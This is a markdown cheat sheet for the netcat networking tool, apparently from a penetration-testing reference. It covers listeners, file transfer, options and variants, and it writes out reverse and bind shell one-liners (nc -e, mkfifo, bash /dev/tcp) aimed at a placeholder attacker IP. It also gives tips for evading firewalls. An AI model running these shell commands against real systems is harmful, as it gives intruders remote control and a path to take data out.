---
title: nc
category: tool
subcategory: networking
tags: ["netcat", "reverse-shell", "file-transfer", "tcp", "udp"]
---

# nc (netcat)

## Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
  - [Listeners](#listeners)
  - [Reverse Shells](#reverse-shells)
  - [File Transfer](#file-transfer)
- [Key Options](#key-options)
- [Variants](#variants)
- [Documentation](#documentation)

## Overview

Netcat (nc) is a versatile command-line networking utility often called the "Swiss Army knife" of TCP/UDP networking. It reads and writes data across network connections, making it essential for penetration testing tasks including port scanning, banner grabbing, file transfers, and establishing reverse/bind shells.

Multiple variants exist:
- **nc.traditional** - Original version with `-e` for command execution
- **nc.openbsd** - Safer reimplementation, supports `-X` proxy
- **ncat** - Modern version from Nmap with SSL support and access control

## Quick Start

### Listeners

```bash
# Basic TCP listener
nc -lvnp 4444

# Keep listening after disconnect (ncat)
ncat -lvnkp 4444

# UDP listener
nc -lvnup 4444

# SSL listener (ncat)
ncat --ssl -lvnp 4444
```

### Reverse Shells

**With -e support (nc.traditional):**
```bash
nc <attacker_ip> 4444 -e /bin/bash
```

**Without -e (most modern versions):**
```bash
# Using mkfifo (most reliable)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Using bash /dev/tcp (no netcat required)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

**Bind shell:**
```bash
# With -e
nc -lvnp 4444 -e /bin/bash

# Without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
```

### File Transfer

**Receiver (set up first):**
```bash
nc -lvnp 4444 > received_file.txt
```

**Sender:**
```bash
nc <receiver_ip> 4444 < file_to_send.txt
```

**Transfer directory with tar:**
```bash
# Receiver
nc -lvnp 4444 | tar xvf -

# Sender
tar cvf - /path/to/dir | nc <receiver_ip> 4444
```

## Key Options

| Option | Description |
|--------|-------------|
| `-l` | Listen mode (server) |
| `-v` | Verbose output |
| `-n` | Skip DNS resolution |
| `-p` | Specify port |
| `-e` | Execute command on connection (nc.traditional only) |
| `-u` | UDP mode (default is TCP) |
| `-w` | Timeout in seconds |
| `-z` | Zero-I/O mode (port scanning) |
| `-k` | Keep listening after disconnect (ncat) |
| `-4/-6` | Force IPv4/IPv6 |
| `-X` | Proxy protocol (4, 5, connect) |
| `-x` | Proxy address |
| `--ssl` | Enable SSL/TLS (ncat only) |

## Variants

| Variant | Package | Key Features |
|---------|---------|--------------|
| nc.traditional | netcat-traditional | Original, supports `-e` for command execution |
| nc.openbsd | netcat-openbsd | Safer, no `-e` by default, proxy support |
| ncat | ncat | SSL support, access control, persistent listening |

**Installation:**
```bash
# Install variant
sudo apt install netcat-openbsd  # or netcat-traditional, ncat

# Switch between variants
sudo update-alternatives --config nc

# Check installed variant
ls -la /usr/bin/nc
```

## Documentation

| File | Description |
|------|-------------|
| [techniques.md](techniques.md) | Comprehensive pentesting techniques guide |
| [options.md](options.md) | Command-line help output |
| [manpage.md](manpage.md) | Full man page with examples |

## Tips

1. **Better shell experience:** `rlwrap nc -lvnp 4444`
2. **Upgrade shell:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`
3. **Avoid common ports:** Use 80, 443, 8080 to bypass firewalls
4. **Reverse > Bind:** Outbound connections more likely to succeed
5. **Clean up:** Remove `/tmp/f` after testing

## Related Tools

- **socat** - Advanced socket tool with PTY support
- **pwncat** - Python netcat with auto shell upgrade
- **chisel** - TCP/UDP tunnel over HTTP
- **rlwrap** - Readline wrapper for command history
